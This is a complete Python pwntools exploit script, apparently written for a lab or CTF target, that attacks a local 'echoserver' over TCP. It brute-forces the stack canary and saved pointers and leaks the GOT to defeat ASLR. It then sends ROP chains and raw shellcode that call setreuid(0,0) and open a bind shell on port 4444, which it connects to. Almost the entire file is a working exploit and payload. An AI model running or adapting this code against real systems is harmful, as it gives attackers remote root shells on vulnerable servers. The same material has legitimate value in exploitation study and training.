#!/usr/bin/env python3

import os
from pwn import *
from leakmod import leak


def leak_stack():
    padding = b'A' * 264
    # Canary is after vulnerable buffer and other variables on the stack
    canary = leak(padding, delay=0.07)
    log.success(
        f'''
        ##################################
        Canary: 0x{canary[::-1].hex()}
        ##################################
        ''')

    p = log.progress('Wait for connections to close')
    for i in range(10, 0, -1):
        p.status(f'waiting ({i} seconds left)')
        sleep(1)
    p.success()

    padding += canary
    # Saved frame base pointer is after buffer, variables and canary on the stack
    savedframeptr = leak(padding, 'saved frame pointer', delay=0.07)
    log.success(
        f'''
        ##################################
        SFP: 0x{savedframeptr[::-1].hex()}
        ##################################
        ''')

    p = log.progress('Wait for connections to close')
    for i in range(10, 0, -1):
        p.status(f'waiting ({i} seconds left)')
        sleep(1)
    p.success()

    padding += savedframeptr
    # Return address / return instruction pointer is after buffer, variables, canary and SFP on the stack
    retaddr = leak(padding, 'return address', delay=0.07)
    log.success(
        f'''
        ##################################
        Return address: 0x{retaddr[::-1].hex()}
        ##################################
        ''')

    return (canary, savedframeptr, retaddr)


def leak_got(bin_base=b'', canary=b'', sfp=b'', poprsi_offset=0x1601, got_offset=0x3f38, write_offset=0x1574):
    # Address of pop rsi; pop r15; ret (default: offset 0x1601 from base)
    poprsi_addr = p64(u64(bin_base) + poprsi_offset)
    # Address of the GOT (default: offset 0x3f38 from base)
    got_addr = p64(u64(bin_base) + got_offset)
    # Address of write instruction in main loop (default: offset 0x1574 from base)
    write_addr = p64(u64(bin_base) + write_offset)

    payload = b''
    payload += b'A' * 264       # Padding
    payload += canary           # Stack canary
    payload += sfp              # Saved frame pointer
    payload += poprsi_addr      # pop rsi; pop r15; ret address
    payload += got_addr         # GOT address to pop into rsi
    payload += p64(0x0)         # Junk to pop into r15
    payload += write_addr       # Write instruction to return to (destination file descriptor set in echo, number of bytes set in echo)

    # Send payload to echoserver and wait for reply
    r = remote('localhost', 2323)
    r.send(payload)
    reply = r.recvall()

    return reply


def spawn_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b'', poprdi_offset=0x1603, ret_offset=0x101a, system_offset=0x55410, binsh_offset=0x1b75aa):
    # Address of system function
    system_addr = p64(u64(libc_base) + system_offset)
    log.info(f'system() is loaded at 0x{system_addr[::-1].hex()}')

    # Address of ret instruction
    ret_addr = p64(u64(bin_base) + ret_offset)
    log.info(f'ret instruction is loaded at 0x{ret_addr[::-1].hex()}')

    # Address of "/bin/sh" string in libc
    binsh_addr = p64(u64(libc_base) + binsh_offset)
    log.info(f'"/bin/sh" string is loaded at 0x{binsh_addr[::-1].hex()}')

    # Address of pop rdi; ret instructions
    poprdi_addr = p64(u64(bin_base) + poprdi_offset)
    log.info(
        f'pop rdi; ret instructions are loaded at 0x{poprdi_addr[::-1].hex()}')

    payload = b''
    payload += b'A' * 264       # Padding
    payload += canary           # Stack canary
    payload += sfp              # Saved frame pointer
    payload += ret_addr         # ret address
    payload += poprdi_addr      # pop rdi; ret address
    payload += binsh_addr       # "/bin/sh" address
    payload += system_addr      # system() address

    r = remote('localhost', 2323)
    r.send(payload)
    r.close()


def bind_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b''):

    libc_base_int = u64(libc_base)
    bin_base_int = u64(bin_base)

    payload = b''
    payload += b'A' * 264
    payload += canary
    payload += sfp
    # Socket creation
    payload += p64(libc_base_int + 0x0000000000026b72)  # pop rdi; ret;
    payload += p64(2)                                   # AF_INET
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(1)                                   # SOCK_STREAM
    payload += p64(libc_base_int + 0x0000000000141ee1)  # xor edx, edx; mov eax, r10d; ret;
    payload += p64(libc_base_int + 0x0000000000123770)  # socket(AF_INET, SOCK_STREAM, 0)
    payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
    payload += p64(0x100)                               # rcx > rdx
    payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret
    payload += p64(bin_base_int + 0x0000000000001600)   # pop r14; pop r15; ret;
    payload += p64(0)
    payload += p64(0x000000005c110002)                  # port 4444, family 2
    payload += p64(libc_base_int + 0x00000000000331ff)  # pop rbx; ret;
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;  ------------------------------+
    payload += p64(libc_base_int + 0x00000000000e8199)  # push rsp; push rbx; setne al; ret;           | gets pushed and returned to in next gadget
    # Bind    <----------------------------------------------------------------------------------------+
    payload += p64(libc_base_int + 0x000000000011c1e1)  # pop rdx; pop r12; ret;
    payload += p64(0x20)                                # diff between struct address and rsi
    payload += p64(0)                                   # junk for r12
    payload += p64(libc_base_int + 0x0000000000137771)  # mov rax, rsi; pop rbx; ret;
    payload += p64(0)                                   # junk for rbx
    payload += p64(libc_base_int + 0x000000000004a48c)  # sub rax, rdx; ret;
    payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
    payload += p64(0)                                   # number of repetitions => want 0
    payload += p64(libc_base_int + 0x0000000000162052)  # mov rsi, rax; shr ecx, 3; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;
    payload += p64(libc_base_int + 0x000000000011c1e1)  # pop rdx; pop r12; ret;
    payload += p64(16)                                  # rdx to 16
    payload += p64(0)                                   # junk for r12
    payload += p64(libc_base_int + 0x0000000000123130)  # bind()
    # Listen
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(1)                                   # number of clients
    payload += p64(libc_base_int + 0x0000000000123290)  # listen(sock, 1)
    # Accept
    payload += p64(libc_base_int + 0x0000000000141ee1)  # xor edx, edx; mov eax, r10d; ret;
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(0)
    payload += p64(libc_base_int + 0x0000000000123090)  # accept(sock, NULL, NULL)
    payload += p64(libc_base_int + 0x0000000000059c72)  # add edx, eax; mov rax, rdx; pop rbx; ret;
    payload += p64(0)                                   # junk for rbx
    # Close (listening file descriptor)
    payload += p64(libc_base_int + 0x00000000001117e0)  # close(sock)
    payload += p64(libc_base_int + 0x0000000000058dc5)  # mov rax, rdx; ret;
    payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
    payload += p64(0x100)                               # rcx > rdx
    payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret
    # dup2 (attach to remote file descriptor)
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(2)                                   # stderr
    payload += p64(libc_base_int + 0x00000000001118a0)  # dup2(new_sock, stderr)
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(1)                                   # stdout
    payload += p64(libc_base_int + 0x00000000001118a0)  # dup2(new_sock, stdout)
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(0)                                   # stdin
    payload += p64(libc_base_int + 0x00000000001118a0)  # dup2(new_sock, stdin)
    # setreuid
    payload += p64(libc_base_int + 0x0000000000026b72)  # pop rdi; ret;
    payload += p64(0)                                   # ruid 0 (root)
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(0)                                   # euid 0 (root)
    payload += p64(libc_base_int + 0x0000000000117920)  # setreuid(0, 0)
    # execve
    payload += p64(libc_base_int + 0x0000000000026b72)  # pop rdi; ret;
    payload += p64(libc_base_int + 0x00000000001b75aa)  # Address of "/bin/sh" in libc
    payload += p64(libc_base_int + 0x0000000000141ee1)  # xor edx, edx; mov eax, r10d; ret;
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(0)
    payload += p64(libc_base_int + 0x00000000000e6160)  # execve("/bin//sh", NULL, NULL)

    log.info(f'Payload length: {len(payload)} bytes')

    # Send payload => bind shell to port 4444
    r = remote('localhost', 2323)
    r.send(payload)
    r.close()


def exec_shellcode(bin_base=b'', libc_base=b'', canary=b'', sfp=b'', shellcode=b'', length=4096):

    libc_base_int = u64(libc_base)
    bin_base_int = u64(bin_base)

    payload = b''
    payload += b'A' * 264
    payload += canary
    payload += sfp
    # Save the file descriptor (copy to r13)
    payload += p64(libc_base_int + 0x000000000005e6a1)  # mov rax, rdi; ret;
    payload += p64(libc_base_int + 0x00000000000331ff)  # pop rbx; ret;
    payload += p64(libc_base_int + 0x0000000000027528)  # pop r14; ret;  -------------------------------+
    payload += p64(libc_base_int + 0x0000000000047988)  # mov r13, rax; mov rdi, r12; call rbx;         | gets called in next gadget
    # valloc           <--------------------------------------------------------------------------------+
    payload += p64(libc_base_int + 0x0000000000026b72)  # pop rdi; ret;
    payload += p64(length)                              # Allocate length bytes
    payload += p64(libc_base_int + 0x000000000009e690)  # valloc(length)
    # mprotect
    payload += p64(libc_base_int + 0x000000000010556d)  # pop rdx; pop rcx; pop rbx; ret;
    payload += p64(7)                                   # rcx > rdx
    payload += p64(8)                                   # rcx > rdx
    payload += p64(0)                                   # junk for rbx
    payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret;
    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
    payload += p64(length)
    payload += p64(libc_base_int + 0x000000000011b970)  # mprotect(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC)
    # read
    payload += p64(libc_base_int + 0x000000000005e6a1)  # mov rax, rdi; ret;
    payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
    payload += p64(0)                                   # number of repetitions => want 0
    payload += p64(libc_base_int + 0x0000000000162052)  # mov rsi, rax; shr ecx, 3; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;
    payload += p64(libc_base_int + 0x00000000000331ff)  # pop rbx; ret;
    payload += p64(libc_base_int + 0x00000000001626d5)  # pop rax; pop rdx; pop rbx; ret;  -------------+
    payload += p64(libc_base_int + 0x00000000000479c6)  # mov rdi, r13; call rbx;                       | gets called in next gadget
    #                  <--------------------------------------------------------------------------------+
    payload += p64(length)                              # length into rdx
    payload += p64(0)                                   # junk for rbx
    payload += p64(libc_base_int + 0x0000000000110fa0)  # read(sock, addr, length) => read shellcode into memory
    payload += p64(libc_base_int + 0x0000000000028c1e)  # call rsi;

    log.info(f'Payload length: {len(payload)} bytes')

    # Send payload => read from socket to executable memory
    r = remote('localhost', 2323)
    r.send(payload)
    # Send shellcode to execute
    sleep(0.1)
    r.send(shellcode)
    r.close()


def hexdump(bin_data, skip=0):
    hexstring = ''

    try:
        for i in range(skip, len(bin_data), 16):
            hexstring += f'{i:08x}  '
            tmp = ' '.join([f'{j:02x}' for j in bin_data[i:i + 16]])
            tmp = tmp[0:23] + ' ' + tmp[23:]
            hexstring += tmp
            hexstring += '\n'
    except:
        pass

    return hexstring


if __name__ == '__main__':
    # Load binary and libc
    binary = ELF('./echoserver')
    libc = binary.libc

    # context.log_level = 'debug'
    if os.path.isfile('./cache.bin'):
        # Read values from binary cache file
        with open('./cache.bin', 'rb') as f:
            canary = f.read(8)
            sfp = f.read(8)
            rip = f.read(8)
            log.success('Read values from local cache file')
    else:
        # Determine values by brute force leaking
        (canary, sfp, rip) = leak_stack()
        with open('./cache.bin', 'wb') as f:
            f.write(canary)
            f.write(sfp)
            f.write(rip)

    log.success(
        f'Found canary 0x{canary[::-1].hex()}, saved frame pointer 0x{sfp[::-1].hex()} and return address 0x{rip[::-1].hex()}')

    # Base address at which the binary is loaded into memory (substracting the instruction offset from the leaked return address)
    bin_base = p64(u64(rip) - 0x1563)

    got_offset = binary.get_section_by_name('.got').header['sh_addr']
    log.info(
        f'ELF loaded at base address 0x{bin_base[::-1].hex()}, GOT at offset 0x{p64(got_offset)[::-1].hex()}')

    got_data = leak_got(bin_base=bin_base, canary=canary,
                        sfp=sfp, got_offset=got_offset)
    if len(got_data) > 0:
        log.success('Leaked GOT from binary')
    else:
        log.error('Failed leaking GOT from binary')
    # Output reply (including leaked GOT) in hexdump format
    log.info(hexdump(got_data, skip=2))

    # Extract libc address of write from leaked GOT
    write_addr = got_data[0x15a:0x162]
    log.info(f'write() is loaded at 0x{write_addr[::-1].hex()}')

    # Calculate libc base address with write address and write offset
    libc_base = p64(u64(write_addr) - libc.symbols['write'])
    log.info(f'libc is loaded at 0x{libc_base[::-1].hex()}')

    # Create remote shell
    # bind_shell(bin_base, libc_base, canary, sfp)

    shellcode = b''
    # Shellcode for setreuid(0 ,0) (own creation)
    shellcode += b'\x6a\x00\x5f\x6a\x00\x5e\x6a\x71\x58\x0f\x05'
    # Shellcode for spawning a remote shell (taken from https://www.exploit-db.com/shellcodes/46979)
    shellcode += b'\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2' \
                 b'\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x11' \
                 b'\x5c\x54\x5e\x6a\x31\x58\x54\x5e\x6a\x10\x5a\x0f' \
                 b'\x05\x6a\x32\x58\x6a\x01\x5e\x0f\x05\x6a\x2b\x58' \
                 b'\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05' \
                 b'\x49\x92\x6a\x03\x58\x50\x0f\x05\x49\x87\xfa\x5e' \
                 b'\x6a\x21\x58\x48\xff\xce\x0f\x05\xe0\xf6\x48\x31' \
                 b'\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68' \
                 b'\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
    exec_shellcode(bin_base, libc_base, canary, sfp, shellcode)

    # Connect to remote shell
    r = remote('localhost', 4444)
    r.interactive()
